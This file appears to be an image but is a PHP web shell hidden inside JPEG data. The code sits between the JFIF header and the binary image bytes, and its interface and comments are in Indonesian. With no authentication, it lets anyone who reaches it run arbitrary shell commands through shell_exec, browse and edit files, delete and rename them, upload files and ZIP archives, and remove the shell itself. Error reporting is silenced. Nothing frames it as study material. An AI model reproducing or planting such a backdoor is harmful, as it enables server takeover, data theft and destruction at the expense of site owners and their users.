���� JFIF      ��

<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();

// Hapus shell
if (isset($_GET['delete'])) {
    unlink(__FILE__);
    exit("<b>Shell berhasil dihapus!</b>");
}

// Hapus file biasa
if (isset($_GET['deletefile'])) {
    $fileToDelete = realpath($_GET['deletefile']);
    if ($fileToDelete && strpos($fileToDelete, $dir) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "<p style='color:orange'>File berhasil dihapus: $fileToDelete</p>";
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa dihapus.</p>";
    }
}

// Rename file atau folder
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = realpath($_GET['rename']);
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['newname'];
    if (rename($oldPath, $newPath)) {
        echo "<p style='color:lime'>Rename berhasil!</p>";
    } else {
        echo "<p style='color:red'>Rename gagal!</p>";
    }
}

// Upload banyak file sekaligus
if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['name'] as $key => $name) {
        $tmp_name = $_FILES['files']['tmp_name'][$key];
        $target = $dir . DIRECTORY_SEPARATOR . basename($name);
        if (move_uploaded_file($tmp_name, $target)) {
            echo "<p style='color:lime'>Upload berhasil: " . htmlspecialchars($name) . "</p>";
        } else {
            echo "<p style='color:red'>Upload gagal: " . htmlspecialchars($name) . "</p>";
        }
    }
}

// Upload ZIP dan ekstrak otomatis
if (isset($_FILES['zipfile'])) {
    $zipName = $_FILES['zipfile']['name'];
    $zipTmp = $_FILES['zipfile']['tmp_name'];
    $targetZip = $dir . DIRECTORY_SEPARATOR . basename($zipName);
    
    if (move_uploaded_file($zipTmp, $targetZip)) {
        $zip = new ZipArchive;
        if ($zip->open($targetZip) === TRUE) {
            $zip->extractTo($dir);
            $zip->close();
            echo "<p style='color:lime'>ZIP berhasil diupload dan diekstrak.</p>";
            unlink($targetZip);
        } else {
            echo "<p style='color:red'>Gagal membuka file ZIP.</p>";
        }
    } else {
        echo "<p style='color:red'>Upload file ZIP gagal.</p>";
    }
}

// Edit file
if (isset($_GET['edit'])) {
    $fileToEdit = realpath($_GET['edit']);
    if ($fileToEdit && strpos($fileToEdit, $dir) === 0 && is_file($fileToEdit)) {
        if (isset($_POST['save'])) {
            $newContent = $_POST['content'] ?? '';
            file_put_contents($fileToEdit, $newContent);
            echo "<p style='color:lime'>File berhasil disimpan: $fileToEdit</p>";
        }
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Edit File: " . htmlspecialchars(basename($fileToEdit)) . "</h3>";
        echo "<form method='post'>
                <textarea name='content' style='width:100%;height:300px;background:#222;color:#0f0;border:1px solid #555;font-family: monospace;'>" . $content . "</textarea><br>
                <button type='submit' name='save' style='color:white;'>Simpan</button>
                <a href='?dir=" . urlencode($dir) . "' style='margin-left:10px;color:#ccc;'>Batal</a>
              </form>";
        exit;
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa diedit.</p>";
    }
}

// Buat file
if (isset($_POST['newfile'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newfile'];
    file_put_contents($path, '');
}

// Buat direktori
if (isset($_POST['newdir'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newdir'];
    mkdir($path);
}

// Eksekusi command
$cmdOutput = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmdOutput = shell_exec($cmd);
}

$parentDir = dirname($dir);
$scan = scandir($dir);

$dirs = [];
$files = [];
foreach ($scan as $item) {
    if ($item === '.') continue;
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullpath)) $dirs[] = $item;
    else $files[] = $item;
}

// Tampilan
echo "<style>
body{background:#111;color:#fff;font-family:monospace;}
a{color:lime;text-decoration:none;}
table{width:100%; border-collapse: collapse;}
th,td{padding:6px; border:1px solid #333; text-align:left;}
form{margin-top:10px;}
button.deletefile, button.renamefile {
  background: transparent;
  border: none;
  color: white;
  cursor: pointer;
  font-weight: bold;
}
</style>";

echo "<h3>Directory: $dir</h3>";
echo "<a href='?dir=" . urlencode($parentDir) . "'>&larr; Kembali</a><br><br>";

echo "<table><tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Permission</th><th>Opsi</th></tr>";
foreach ($dirs as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td><a href='?dir=" . urlencode($fullpath) . "'>📁 $item</a></td>
        <td>-</td>
        <td>" . date('Y-m-d H:i', filemtime($fullpath)) . "</td>
        <td>rwxr-xr-x ($perm)</td>
        <td>
            <form method='post' action='?dir=" . urlencode($dir) . "&rename=" . urlencode($fullpath) . "' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
foreach ($files as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td>$item</td>
        <td>" . filesize($fullpath) . " B</td>
        <td>" . date('Y-m-d H:i', filemtime($fullpath)) . "</td>
        <td>rw-r--r-- ($perm)</td>
        <td>
            <a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($fullpath) . "' style='color:white'> Edit</a> | 
            <a href='?dir=" . urlencode($dir) . "&deletefile=" . urlencode($fullpath) . "' onclick=\"return confirm('Yakin mau hapus file ini?');\" style='color:red'>🗑 Hapus</a>
            <form method='post' action='?dir=" . urlencode($dir) . "&rename=" . urlencode($fullpath) . "' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
echo "</table>";

// Form buat file & folder
echo "<form method='post'>
    <input type='text' name='newfile' placeholder='Nama file baru'>
    <button type='submit'>+ Buat File</button>
</form>
<form method='post'>
    <input type='text' name='newdir' placeholder='Nama folder baru'>
    <button type='submit'>+ Buat Folder</button>
</form>";

// Form upload multiple files
echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;'>
<label style='color:lime;'>Upload file (banyak sekaligus):</label><br>
<input type='file' name='files[]' multiple required>
<button type='submit'>Upload</button>
</form>";

// Form upload ZIP
echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;'>
<label style='color:lime;'>Upload file ZIP (akan diekstrak otomatis):</label><br>
<input type='file' name='zipfile' accept='.zip' required>
<button type='submit'>Upload & Extract</button>
</form>";

// Form command
echo "<hr><form method='post'>
    <label style='color:lime'>Execute Command:</label><br>
    <input type='text' name='cmd' style='width:80%; background:#222; color:#fff; border:1px solid #555;' placeholder='Masukkan perintah shell...' autocomplete='off' required>
    <button type='submit'>Run</button>
</form>";
if ($cmdOutput !== '') {
    echo "<pre style='background:#222; color:#0f0; padding:10px; margin-top:10px; white-space: pre-wrap;'>" . htmlspecialchars($cmdOutput) . "</pre>";
}

// Link hapus shell
echo "<br><a href='?delete=true' style='color:red'>🗑 Hapus Shell Ini</a>";

?>



			

		


�� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
